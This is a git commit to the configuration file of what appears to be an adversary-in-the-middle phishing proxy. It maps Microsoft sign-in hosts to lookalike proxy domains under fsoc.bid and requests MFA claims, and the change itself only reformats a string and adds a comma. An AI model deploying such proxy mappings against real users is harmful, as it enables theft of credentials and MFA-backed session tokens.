94872d95d411f0fa7deee42b28e00c3952439a04
Fakeapate <imboden.samuel@protonmail.ch>
2024-05-18 09:09:29 +0200

    chore: Update aitm_config.py with mfa_claim changes
    Update the `aitm_config.py` file to include changes to the `mfa_claim` configuration. The `mfa_claim` now includes separate entries for `id_token` and `access_token`, each with their own `amr` values. This change ensures proper authentication and authorization for MFA (Multi-Factor Authentication) purposes.

--- src/aitm/aitm_config.py
+++ src/aitm/aitm_config.py
@@ -7,14 +7,15 @@ from __future__ import annotations
 from aitm.helpers.config import Config
 
 config = Config(
-    mfa_claim='{"id_token":{"amr":{"essential":true,"values":["mfa"]}},"access_token":{"amr":{"essential":true,"values":["mfa"]}}}',
+    mfa_claim='{"id_token":{"amr":{"essential":true,"values":["mfa"]}},'
+    '"access_token":{"amr":{"essential":true,"values":["mfa"]}}}',
     auth_url=["/kmsi"],
     local_upstream_hostname="local.upstream.host",
 )
 
 config.targets = [
     {"origin": "mysignins.microsoft.com", "proxy": "mysignins.fsoc.bid", "port": 6000},
-    {"origin": "login.microsoftonline.com", "proxy": "login.fsoc.bid", "port": 6001}
+    {"origin": "login.microsoftonline.com", "proxy": "login.fsoc.bid", "port": 6001},
 ]
 config.content_types = [
     "text/html",
